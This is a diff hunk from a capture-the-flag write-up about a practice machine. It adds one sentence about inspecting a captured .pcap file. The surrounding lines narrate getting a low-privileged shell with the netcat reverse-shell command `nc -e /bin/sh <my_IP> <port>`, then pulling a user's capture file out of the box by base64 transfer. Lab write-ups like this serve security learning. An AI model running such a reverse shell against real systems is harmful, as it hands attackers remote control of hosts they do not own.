@@ -57,7 +57,7 @@ I have written a simple python script which sends the payload to the server whic
 </p>
 As we enumerate through the web server we see that it doesn't have python installed. So one of the way to get a shell is through netcat in which the -e switch is allowed in this machine. We received a low privileged shell using the following command:<br>
 `nc -e /bin/sh <my_IP> <port>`<br>
-After enumerating for a some time i found user zeus on the box. So i navigated to the users' home directory. Then i found a file called captured.pcap in `/home/zeus/airgeddon/captured/` directory.Then transfered that file into my machine using base64 transfer technique (will be breifly introducing the methods to transfer files in the upcoming posts). 
+After enumerating for a some time i found user zeus on the box. So i navigated to the users' home directory. Then i found a file called captured.pcap in `/home/zeus/airgeddon/captured/` directory.Then transfered that file into my machine using base64 transfer technique (will be breifly introducing the methods to transfer files in the upcoming posts). By doing a file command on the .cap file we see the following output:<br>
 <p align="center">
   <img width="900" height="18" src="https://fir3wa1-k3r.github.io/imgs/olympus_7.png">
 </p>
